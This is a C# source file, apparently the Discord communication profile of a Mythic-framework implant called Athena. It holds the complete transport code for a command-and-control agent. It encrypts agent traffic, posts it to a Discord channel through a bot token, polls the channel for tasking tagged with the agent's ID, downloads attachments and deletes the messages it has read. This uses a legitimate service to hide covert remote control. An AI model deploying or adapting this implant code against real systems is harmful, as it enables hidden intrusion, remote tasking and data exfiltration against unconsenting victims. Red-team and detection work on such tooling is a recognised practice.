using Athena.Utilities;
using System;
using System.Net;
using System.Net.Security;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Net.Http;
using System.Text;
using System.Net.Http.Headers;
using System.IO;
using Athena.Models.Config;

namespace Profiles
{
    public class Config : IConfig
    {
        public IProfile profile { get; set; }
        public static string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public Config()
        {
            uuid = "%UUID%";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.profile = new Discord();
        }
    }
    public class Discord : IProfile
    {
        public bool encrypted { get; set; }
        public string messageToken { get; set; }
        public int messageChecks { get; set; }
        public PSKCrypto crypt { get; set; }
        public string psk { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        private HttpClient discordClient { get; set; }
        private string BotToken { get; set; }
        private string ChannelID { get; set; }
        //  private string current_message { get; set; }
        private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
        private string userAgent { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        private string agent_guid = Guid.NewGuid().ToString();
        public Discord()
        {
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            this.messageToken = "discord_token";
            this.ChannelID = "bot_channel";
            this.userAgent = "%USERAGENT%";
            this.messageChecks = int.Parse("message_checks");
            this.timeBetweenChecks = int.Parse("time_between_checks");
            this.proxyHost = "proxy_host:proxy_port";
            this.proxyPass = "proxy_pass";
            this.proxyUser = "proxy_user";
            this.psk = "AESPSK";

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(Config.uuid, this.psk);
                this.encrypted = true;
            }

            HttpClientHandler handler = new HttpClientHandler();

            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    wp.Credentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }
            else
            {
                handler.UseDefaultCredentials = true;
                handler.Proxy = WebRequest.GetSystemWebProxy();
            }

            this.discordClient = new HttpClient(handler);
            this.discordClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bot", this.messageToken);

            if (!String.IsNullOrEmpty(this.userAgent))
            {
                this.discordClient.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }
        }
        //Dockerfile, config.json, c2_server.sh, C2_RPC_functions, dicsord.py
        public async Task<string> Send(object obj)
        {
            try
            {
                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                //This will check to see if it needs to be encrypted first and convert the string properly. You can likely keep this here.
                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(Config.uuid + json);
                }

                MythicMessageWrapper msg = new MythicMessageWrapper()
                {
                    message = json,
                    id = 0,
                    final = true,
                    sender_id = agent_guid,
                    to_server = true
                };

                string strMsg = JsonConvert.SerializeObject(msg);
                if (strMsg.Length > 1950)
                {
                    await SendAttachment(strMsg);
                }
                else
                {
                    await SendMessage(strMsg);
                }

                List<MythicMessageWrapper> agentMessages = new List<MythicMessageWrapper>();
                List<string> msgToRemove = new List<string>();
                int checkins = 0;
                do
                {
                    await Task.Delay(this.timeBetweenChecks * 1000);

                    var messages = await ReadMessages();
                    foreach (var message in messages)
                    {
                        MythicMessageWrapper currentMessage;
                        if (message.attachments.Count > 0)
                        {
                            foreach (var attachment in message.attachments)
                            {
                                if (attachment.filename.Contains(this.agent_guid) && !attachment.filename.EndsWith("server"))
                                {
                                    currentMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(await GetFileContentsAsync(attachment.url));
                                    if (currentMessage is not null && currentMessage.sender_id == this.agent_guid && currentMessage.to_server == false)
                                    {
                                        agentMessages.Add(currentMessage);
                                        msgToRemove.Add(message.id);
                                    }
                                }
                            }
                        }
                        else
                        {
                            if (message.content.Contains(this.agent_guid))
                            {
                                currentMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(message.content);
                                if (currentMessage.sender_id == this.agent_guid && currentMessage.to_server == false)
                                {
                                    agentMessages.Add(currentMessage);
                                    msgToRemove.Add(message.id);
                                }
                            }
                        }
                    }
                    checkins++;
                    if (checkins == this.messageChecks)
                    {
                        return "";
                    }

                } while (agentMessages.Count() < 1);

                //No concept of chunking yet, so just grab one
                json = agentMessages.FirstOrDefault().message;
                DeleteMessages(msgToRemove);

                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                //This will check to see if it needs to be decrypted first and convert the string properly. You can likely keep this here.
                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                if (this.encrypted)
                {
                    return this.crypt.Decrypt(json);
                }
                else
                {
                    if (String.IsNullOrEmpty(json))
                    {
                        return json;
                    }
                    else
                    {
                        return (await Misc.Base64Decode(json)).Substring(36);
                    }
                }
            }
            catch (Exception e)
            {
                return "";
            }
        }
        public async Task<bool> SendMessage(string msg)
        {
            string url = "https://discord.com/api/channels/" + this.ChannelID + "/messages";

            Dictionary<string, string> Payload = new Dictionary<string, string>()
            {
              {"content" , msg }
            };

            StringContent content = new StringContent(JsonConvert.SerializeObject(Payload), Encoding.UTF8, "application/json");
            HttpResponseMessage res = await discordClient.PostAsync(url, content);

            return res.IsSuccessStatusCode ? true : false;
        }

        public async Task<List<ServerDetails>> ReadMessages()
        {
            var url = "https://discordapp.com/api/channels/" + this.ChannelID + "/" + "messages?limit=10";
            var res = await discordClient.GetAsync(url);
            string ResponseMessages = await res.Content.ReadAsStringAsync();
            return JsonConvert.DeserializeObject<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>(); // eithe return the responses Or if it fails get a derisalised response AKA with d ata or no data
        }

        public async Task<bool> SendAttachment2(string msg) //8mb by default, A file upload size limit applies to all files in a request 
        {
            try
            {
                byte[] msgBytes = System.Text.Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(msg));
                string url = "https://discord.com/api/channels/" + ChannelID + "/messages";
                MultipartFormDataContent content = new MultipartFormDataContent();
                ByteArrayContent fileContent = new ByteArrayContent(msgBytes);
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
                {
                    FileName = agent_guid + ".txt",
                };

                content.Add(fileContent);

                using (MemoryStream stream = new MemoryStream(msgBytes))
                {
                    var res = await discordClient.PostAsync(url, fileContent);
                    string responseMessage = await res.Content.ReadAsStringAsync();
                    if (res.IsSuccessStatusCode)
                    {
                        return true;
                    }
                }
                return false;
            }
            catch
            {
                return false;
            }

        }

        public async Task<bool> SendAttachment(string msg) //8mb by default, A file upload size limit applies to all files in a request 
        {
            try
            {
                byte[] msgBytes = System.Text.Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(msg));
                using (MemoryStream memStream = new MemoryStream(msgBytes)) //8mb max filesize
                {
                    var URL = "https://discord.com/api/channels/" + ChannelID + "/messages";
                    var Content = new MultipartFormDataContent();
                    var File_Content = new ByteArrayContent(await new StreamContent(memStream).ReadAsByteArrayAsync());
                    File_Content.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
                    File_Content.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
                    {
                        FileName = agent_guid + ".server",
                    };
                    Content.Add(File_Content);
                    var res = await discordClient.PostAsync(URL, Content);


                    if (res.IsSuccessStatusCode)
                    {
                        return true;
                    }
                    return false;
                }
            }
            catch (Exception e)
            {
                return false;
            }

        }

        private async Task<string> GetFileContentsAsync(string url)
        {
            string message;
            HttpClient client = new HttpClient(); //Needed to create a new one because potentially the headers causing a 401 unauthorized response?

            using (HttpResponseMessage response = await client.GetAsync(url))
            {
                using (HttpContent content = response.Content)
                {
                    message = await content.ReadAsStringAsync();
                }

                if (response.IsSuccessStatusCode)
                {
                    return await Unescape(message);
                }
                return "";
            }
        }

        private async Task<string> Unescape(string message)
        {
            return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");

        }
        public async Task<bool> DeleteMessages(List<string> messages) //server and guild are the same lol
        {
            bool success = false;
            foreach (var id in messages)
            {
                var url = "https://discordapp.com/api/channels/" + this.ChannelID + "/messages/" + id;
                var res = await discordClient.DeleteAsync(url);
                success = res.IsSuccessStatusCode;
            }

            return success;
        }
        public class MythicMessageWrapper
        {
            public string message { get; set; } = String.Empty;
            public string sender_id { get; set; } //Who sent the message
            public bool to_server { get; set; }
            public int id { get; set; }
            public bool final { get; set; }
        }

        //adding Json Classes
        public class GetServerDetails
        {
            public string id { get; set; }
            public int type { get; set; }
            public string name { get; set; }
            public int position { get; set; }
            public int flags { get; set; }
            public string parent_id { get; set; }
            public string guild_id { get; set; }
            public List<object> permission_overwrites { get; set; }
            public string last_message_id { get; set; }
            public object topic { get; set; }
            public int? rate_limit_per_user { get; set; }
            public bool? nsfw { get; set; }
            public int? bitrate { get; set; }
            public int? user_limit { get; set; }
            public object rtc_region { get; set; }
        }
        public class Author
        {
            public string id { get; set; }
            public string username { get; set; }
            public object avatar { get; set; }
            public object avatar_decoration { get; set; }
            public string discriminator { get; set; }
            public int public_flags { get; set; }
            public bool? bot { get; set; }
        }
        public class ServerDetails
        {
            public string id { get; set; }
            public int type { get; set; }
            public string content { get; set; }
            public string channel_id { get; set; }
            public Author author { get; set; }
            public List<Attachment> attachments { get; set; }
            public List<object> embeds { get; set; }
            public List<object> mentions { get; set; }
            public List<object> mention_roles { get; set; }
            public bool pinned { get; set; }
            public bool mention_everyone { get; set; }
            public bool tts { get; set; }
            public DateTime timestamp { get; set; }
            public object edited_timestamp { get; set; }
            public int flags { get; set; }
            public List<object> components { get; set; }
            public string webhook_id { get; set; }
        }
        public class ChannelResponse
        {
            public string id { get; set; }
            public object last_message_id { get; set; }
            public int type { get; set; }
            public string name { get; set; }
            public int position { get; set; }
            public int flags { get; set; }
            public object parent_id { get; set; }
            public object topic { get; set; }
            public string guild_id { get; set; }
            public List<object> permission_overwrites { get; set; }
            public int rate_limit_per_user { get; set; }
            public bool nsfw { get; set; }
        }
        public class ChannelCreateSend
        {
            public string name { get; set; }
            public int type { get; set; }
        }
        public class Attachment
        {
            public string id { get; set; }
            public string filename { get; set; }
            public string? description { get; set; }
            public string? content_type { get; set; }
            public int size { get; set; }
            public string url { get; set; }
            public string proxy_url { get; set; }
            public int? height { get; set; }
            public int? width { get; set; }
            public bool? ephemeral { get; set; }
        }
    }
}